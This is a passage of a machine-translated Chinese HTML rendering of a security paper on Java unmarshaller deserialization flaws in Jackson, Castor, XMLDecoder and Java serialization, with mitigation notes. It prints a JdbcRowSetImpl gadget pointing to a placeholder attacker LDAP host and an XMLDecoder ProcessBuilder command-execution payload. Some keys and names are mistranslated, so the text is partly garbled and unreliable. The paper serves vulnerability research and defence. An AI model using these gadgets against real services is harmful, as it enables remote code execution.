<div style="position:absolute;top:10555;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编组</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括使用 Java 类名的那些。</font></font></nobr></div>
<div style="position:absolute;top:10573;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jackson 需要一个默认构造函数，但允许非</font></font></nobr></div>
<div style="position:absolute;top:10591;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公共的，也允许非公共的 setter 方法。</font></font></nobr></div>
<div style="position:absolute;top:10614;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型检查在这些模式下仍然有效，因此利用</font></font></nobr></div>
<div style="position:absolute;top:10631;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还需要使用超类型的 readValue() 或</font></font></nobr></div>
<div style="position:absolute;top:10649;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有该类型的嵌套字段/集合。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16</font></font></font></nobr></div>
<div style="position:absolute;top:10672;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型信息有多种表示形式</font></font></nobr></div>
<div style="position:absolute;top:10690;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tion </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，都表现出相同的行为。</font><font style="vertical-align: inherit;">此外，还有多</font></font></nobr></div>
<div style="position:absolute;top:10708;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全局启用这种多态性的几种方法</font></font></nobr></div>
<div style="position:absolute;top:10726;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 ObjectMapper-&gt;enableDefaultTyping()，一个自定义</font></font></nobr></div>
<div style="position:absolute;top:10745;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TypeResolverBuilder，或在本地使用@JsonTypeInfo</font></font></nobr></div>
<div style="position:absolute;top:10761;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在一个领域。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">取决于 Jackson 的确切版本，</font></font></nobr></div>
<div style="position:absolute;top:10779;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这可能可以使用</font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;">JdbcRowset</font></a></font><font style="vertical-align: inherit;">加以利用</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"></font></a></font><a href="https://translate.googleusercontent.com/translate_f#18"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
<div style="position:absolute;top:10809;left:178"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[“com.sun.rowset.JdbcRowSetImpl”,{</font></font></nobr></div>
<div style="position:absolute;top:10827;left:196"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“数据源名称”：</font></font></nobr></div>
<div style="position:absolute;top:10845;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"ldap://攻击者/obj",</font></font></nobr></div>
<div style="position:absolute;top:10863;left:196"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“自动提交”：真</font></font></nobr></div>
<div style="position:absolute;top:10881;left:178"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}]</font></font></nobr></div>
<div style="position:absolute;top:10916;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，当 Jackson 检查时，这不适用于低于 2.7.0 的 Jackson 版本</font></font></nobr></div>
<div style="position:absolute;top:10934;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是否定义了多个冲突的setter方法，以及JdbcRowSetImpl</font></font></nobr></div>
<div style="position:absolute;top:10952;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'matchColumn' 属性有三个。</font><font style="vertical-align: inherit;">Jackson 2.7.0 版增加了一些分辨率</font></font></nobr></div>
<div style="position:absolute;top:10970;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些场景的逻辑。</font><font style="vertical-align: inherit;">不幸的是，解析逻辑有问题：取决于</font></font></nobr></div>
<div style="position:absolute;top:10988;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Class-&gt;getMethods() 顺序，这是非常随机的，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查不会失败，因为它</font></font></nobr></div>
<div style="position:absolute;top:11006;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应该。</font></font></nobr></div>
<div style="position:absolute;top:11028;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除此之外，还可以使用</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringPropFac</font></font></a></font><a href="https://translate.googleusercontent.com/translate_f#22"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font></a> <font style="vertical-align: inherit;"><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;">SpringB-</font></a></font><font style="vertical-align: inherit;">可靠地利用</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jackson</font></font></a></font></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:11046;left:167"><nobr><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FAdv </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> C3P0RefDS </font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">,</font></font></a> </font><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> C3P0WrapDS</font></font></a><font color="#000000"><a href="https://translate.googleusercontent.com/translate_f#21"></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, 以及</font></font></font><a href="https://translate.googleusercontent.com/translate_f#27"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RMIRemoteObj</font></font></a><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果这适用于</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:11109;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最近才报告，而且这里描述的大多数有效载荷由于自定义而不适用</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:11125;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可见性设置</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:11137;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是一种特殊情况，因为它允许通过属性指定任意根类型。</font></font></font></nobr></div>
<div style="position:absolute;top:11151;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15</font></font><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://wiki.fasterxml.com/JacksonPolymorphicDeserialization"></a><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://wiki.fasterxml.com/JacksonPolymorphicDeserialization"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://维基</font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://wiki.fasterxml.com/JacksonPolymorphicDeserialization"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://wiki.fasterxml.com/JacksonPolymorphicDeserialization"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更快的xml </font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://wiki.fasterxml.com/JacksonPolymorphicDeserialization"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=http://wiki.fasterxml.com/JacksonPolymorphicDeserialization"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com/JacksonPolymorphicDeserialization</font></font></a></font></nobr></div>
<div style="position:absolute;top:11166;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当使用泛型并应用类型擦除时，情况也可能如此。</font></font></font></nobr></div>
<div style="position:absolute;top:11180;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">17</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过包装对象或通过附加属性，使用 Id.CLASS 和 Id.MINIMAL_CLASS</font></font></font></nobr></div>
<div style="position:absolute;top:11194;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">@JsonTypeInfo 在一个类上通常是无害的，因为这已经意味着对子类的限制。</font></font></font></nobr></div>
<div style="position:absolute;top:11208;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但使用 SoftReference 缓存，因此只要进程是</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:11225;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跑步</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:11285;left:443"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:11533;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="10"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 10 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:11696;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标环境。</font></font></nobr></div>
<div style="position:absolute;top:11720;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">减轻</font></font></b></nobr></div>
<div style="position:absolute;top:11753;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用带有 JsonTypeInfo.Id.NAME 和 @JsonTypeInfo 的显式多态性</font></font></nobr></div>
<div style="position:absolute;top:11770;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">明确指定的子类型。</font></font></nobr></div>
<div style="position:absolute;top:11830;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.7 脚轮</font></font></b></nobr></div>
<div style="position:absolute;top:11877;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参考</font></font></b></nobr></div>
</span></font>
<font size="3" color="#0000cc" face="Times"><span style="font-size:12px;font-family:Times;color:#0000cc">
<div style="position:absolute;top:11907;left:564"><nobr><b><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://issues.opennms.org/browse/NMS-9100"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NMS-9100</font></font></a></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> OpenNMS</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:11952;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用有效载荷</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:11985;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#23"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SpringBFAdv (4.12)</font></font></a></nobr></div>
<div style="position:absolute;top:12015;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#21"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C3P0WrapDS (4.9)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:11861;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要公共默认构造函数。</font><font style="vertical-align: inherit;">有几种</font></font></nobr></div>
<div style="position:absolute;top:11879;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个的特点之一，调用顺序不是</font></font></nobr></div>
<div style="position:absolute;top:11897;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完全由攻击者决定——原始属性将</font></font></nobr></div>
<div style="position:absolute;top:11915;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法设置在对象值之前，它支持附加</font></font></nobr></div>
<div style="position:absolute;top:11933;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以触发的属性访问器方法，即</font></font></nobr></div>
<div style="position:absolute;top:11952;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">addXYZ(java.lang.Object) 和 createXYZ()，以及过滤器</font></font></nobr></div>
<div style="position:absolute;top:11968;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据声明的类型取出一些属性。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20</font></font></font></nobr></div>
<div style="position:absolute;top:11990;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原始先于对象策略可防止漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:12008;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和灰</font></font><font color="#800000"><a href="https://translate.googleusercontent.com/translate_f#18"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的JdbcRowSet</font></font></a></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为一个需要设置字符串值</font></font></nobr></div>
<div style="position:absolute;top:12026;left:165"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原始“autoCommit”道具之前的“dataSourceName”</font></font></nobr></div>
<div style="position:absolute;top:12044;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">呃。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21</font></font></font></nobr></div>
<div style="position:absolute;top:12065;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用指定的顶级类型，但不检查嵌套的属性类型。</font></font></nobr></div>
<div style="position:absolute;top:12090;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">减轻</font></font></b></nobr></div>
<div style="position:absolute;top:12122;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">没有用于类型白名单的配置选项。</font><font style="vertical-align: inherit;">定制它来做它看起来有点</font></font></nobr></div>
<div style="position:absolute;top:12140;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">棘手。</font></font></nobr></div>
<div style="position:absolute;top:12199;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.1.8 Java XMLDecoder</font></font></b></nobr></div>
<div style="position:absolute;top:12230;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只是为了完整性。</font><font style="vertical-align: inherit;">众所周知，这是极其危险的，因为它</font></font></nobr></div>
<div style="position:absolute;top:12248;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许任意类型的任意方法和构造函数调用：</font></font></nobr></div>
<div style="position:absolute;top:12276;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;new class="java.lang.ProcessBuilder"&gt;</font></font></nobr></div>
<div style="position:absolute;top:12294;left:187"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;string&gt;/usr/bin/gedit&lt;/string&gt;&lt;method name="start" /&gt;</font></font></nobr></div>
<div style="position:absolute;top:12312;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/新&gt;</font></font></nobr></div>
<div style="position:absolute;top:12349;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">减轻</font></font></b></nobr></div>
<div style="position:absolute;top:12382;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不......永远，永远，在不绝对信任的数据上使用它。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:12421;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这看起来像一个错误：如果声明的非抽象类型没有</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:12437;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即使子类型可能有一个公共默认构造函数。</font><font style="vertical-align: inherit;">虽然 Castor 允许</font></font></nobr></div>
<div style="position:absolute;top:12451;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过javax.management.loading.MLet构造一个URLClassLoader，无法注入</font></font></nobr></div>
<div style="position:absolute;top:12466;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将实例转换为属性，因为超类型没有公共默认构造函数。</font><font style="vertical-align: inherit;">如果这是</font></font></nobr></div>
<div style="position:absolute;top:12480;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能，甚至在 Castor 本身中也会有一个可利用的实例。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:12492;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 com.sun.rowset.CachedRowSetImpl-&gt;addRowSet() 会有一个替代路线</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:12508;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导致 com.sun.rowset.JdbcRowSetImpl-&gt;getMetaData()，如果不是因为看起来像</font></font></nobr></div>
<div style="position:absolute;top:12522;left:186"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准库错误。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:12547;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:12795;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="11"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 11 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:15px;font-family:Times">
<div style="position:absolute;top:12955;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2 基于现场的编组器</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:12990;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于现场的编组器通常提供的攻击面要少得多</font></font></nobr></div>
<div style="position:absolute;top:13008;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对对象进行的方法调用 - 有些甚至设法解组非集合</font></font></nobr></div>
<div style="position:absolute;top:13025;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象根本不调用一个。</font><font style="vertical-align: inherit;">由于几乎没有对象可以重新</font></font></nobr></div>
<div style="position:absolute;top:13043;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在没有设置私有字段的情况下存储，它们会直接混淆对象内部，</font></font></nobr></div>
<div style="position:absolute;top:13061;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这可能会产生不良副作用。</font><font style="vertical-align: inherit;">此外，许多类型 - 首先是</font></font></nobr></div>
<div style="position:absolute;top:13079;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">集合 - 无法使用它们的运行时表示有效地传输/存储</font></font></nobr></div>
<div style="position:absolute;top:13097;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">站。</font><font style="vertical-align: inherit;">这意味着，基于所有现场marshallers捆绑定制的转换器</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font></nobr></div>
<div style="position:absolute;top:13115;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">某种类型。</font><font style="vertical-align: inherit;">这些转换器或它们的目标类型通常必须</font></font></nobr></div>
<div style="position:absolute;top:13133;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在攻击者提供的对象上调用方法。</font><font style="vertical-align: inherit;">例如集合插入</font></font></nobr></div>
<div style="position:absolute;top:13151;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导致调用 java.lang.Object-&gt;hashCode()、java.lang.Object-&gt;equals() 和</font></font></nobr></div>
<div style="position:absolute;top:13170;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">java.lang.Comparable-&gt;compareTo() 用于排序的变体。</font><font style="vertical-align: inherit;">视情况而定</font></font></nobr></div>
<div style="position:absolute;top:13187;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">补充，可能还有其他可以触发的。</font></font></nobr></div>
<div style="position:absolute;top:13230;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.1 Java 序列化</font></font></b></nobr></div>
<div style="position:absolute;top:13279;left:564"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用有效载荷</font></font></b></nobr></div>
</span></font>
<font size="3" color="#800000" face="Times"><span style="font-size:12px;font-family:Times;color:#800000">
<div style="position:absolute;top:13312;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#24"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">XBean (4.14)</font></font></a></nobr></div>
<div style="position:absolute;top:13342;left:572"><nobr><a href="https://translate.googleusercontent.com/translate_f#25"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BeanComp (4.17)</font></font></a></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:13262;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括作者在内的很多人都做过研究</font></font></nobr></div>
<div style="position:absolute;top:13280;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自 Chris Frohoff 和 Garbriel 以来的 Java 序列化小工具</font></font></nobr></div>
<div style="position:absolute;top:13298;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">劳伦斯已经发布了他们的 RCE 有效载荷目标</font></font></nobr></div>
<div style="position:absolute;top:13316;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Commons 集合、Spring Beans 和 Groovy。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然</font></font></nobr></div>
<div style="position:absolute;top:13334;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类似的漏洞之前已经知道，研究</font></font></nobr></div>
<div style="position:absolute;top:13352;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Frohoff 和 Lawrence 及其产生的影响表明</font></font></nobr></div>
<div style="position:absolute;top:13370;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些不是孤立的事件，而是普遍现象的一部分</font></font></nobr></div>
<div style="position:absolute;top:13388;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">问题。</font><font style="vertical-align: inherit;">有很多可用的材料，ysoserial </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供了大多数</font></font></nobr></div>
<div style="position:absolute;top:13406;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已发布的小工具，因此这里不会提供任何细节——除非他们</font></font></nobr></div>
<div style="position:absolute;top:13424;left:167"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以应用于其他机制。</font></font></nobr></div>
<div style="position:absolute;top:13449;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">减轻</font></font></b></nobr></div>
<div style="position:absolute;top:13482;left:173"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Java 8u121 引入了 JRE 标准类型过滤机制。</font><font style="vertical-align: inherit;">各种各样的</font></font></nobr></div>
<div style="position:absolute;top:13500;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">支持白名单的用户空间过滤器实现可用。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:6px;font-family:Times">
<div style="position:absolute;top:13718;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Java 序列化的情况下，自定义逻辑由类型本身提供。</font></font></font></nobr></div>
<div style="position:absolute;top:13732;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23</font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或更确切地说，自从他们的出版物终于得到应有的关注以来</font></font></font></nobr></div>
<div style="position:absolute;top:13746;left:168"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24</font></font><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/frohoff/ysoserial/"></a><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/frohoff/ysoserial/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://github </font></font></a></font><i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/frohoff/ysoserial/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></a></font></i><font color="#0000cc" style="font-size:9px"><a href="https://translate.google.com/translate?hl=zh-CN&amp;prev=_t&amp;sl=en&amp;tl=zh-CN&amp;u=https://github.com/frohoff/ysoserial/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">com/frohoff/ysoserial/</font></font></a></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:13809;left:439"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:14057;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="12"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 12 页</font></font></b></a></font></td></tr></tbody></table></div><font size="3" face="Times"><span style="font-size:12px;font-family:Times">
<div style="position:absolute;top:14219;left:167"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.2.2 克里奥</font></font></b></nobr></div>
